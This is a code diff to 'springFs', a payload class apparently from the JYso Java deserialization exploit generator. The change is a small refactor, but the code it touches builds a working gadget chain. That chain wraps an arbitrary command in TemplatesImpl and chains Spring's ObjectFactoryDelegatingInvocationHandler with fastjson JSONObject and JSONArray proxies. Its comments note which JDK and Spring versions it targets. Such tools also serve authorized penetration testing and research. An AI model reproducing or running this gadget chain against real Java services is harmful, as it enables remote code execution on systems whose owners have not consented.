@@ -21,9 +21,11 @@ import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.Objects;
 
 import static com.qi4l.JYso.gadgets.utils.Utils.makeMap;
 
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 public class springFs implements ObjectPayload<Object>, Serializable {
     public static ClassPool pool = ClassPool.getDefault();
     // jdk7下使用badAttributeValueExpException,jdk8以上使用xString可打高版本JDK(jdk17)
@@ -31,14 +33,14 @@ public class springFs implements ObjectPayload<Object>, Serializable {
     // 低版本Spring-beans <5.3 -8835275493235412717
     // 高版本Spring-beans >=5.3 -1515767093960859525"
     public String serialVersionUID = "-1515767093960859525";
-    private Object inv;
 
     @Override
     public Object getObject(String command) throws Exception {
 
         Object obj = Gadgets.createTemplatesImpl(command);
 
-        if (this.serialVersionUID == "-1515767093960859525") {
+        Object inv;
+        if (Objects.equals(this.serialVersionUID, "-1515767093960859525")) {
 
             CtClass ctClass;
             try {
@@ -54,21 +56,21 @@ public class springFs implements ObjectPayload<Object>, Serializable {
             try {
                 CtField field = ctClass.getDeclaredField("serialVersionUID");
                 ctClass.removeField(field);
-            } catch (NotFoundException e) {
+            } catch (NotFoundException ignored) {
             }
             ctClass.addField(CtField.make("private static final long serialVersionUID = " + serialVersionUID + "L;", ctClass));
             Class<?> aClass = ctClass.toClass(new URLClassLoader(new URL[0]), null);
-            this.inv = Reflections.createWithoutConstructor(aClass);
+            inv = Reflections.createWithoutConstructor(aClass);
             ctClass.defrost();
         } else {
-            this.inv = Reflections.createWithoutConstructor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
+            inv = Reflections.createWithoutConstructor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
         }
         HashMap<String, Object> hashMap = new HashMap<>();
         hashMap.put("object", obj);
         JSONObject jsonObject = new JSONObject(hashMap);
         Object o2 = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{ObjectFactory.class}, jsonObject);
-        Reflections.setFieldValue(this.inv, "objectFactory", o2);
-        Object o = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{Templates.class}, (InvocationHandler) this.inv);
+        Reflections.setFieldValue(inv, "objectFactory", o2);
+        Object o = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{Templates.class}, (InvocationHandler) inv);
         JSONArray jsonArray = new JSONArray();
         jsonArray.add(o);
         if (this.toString.equals("xString")) {
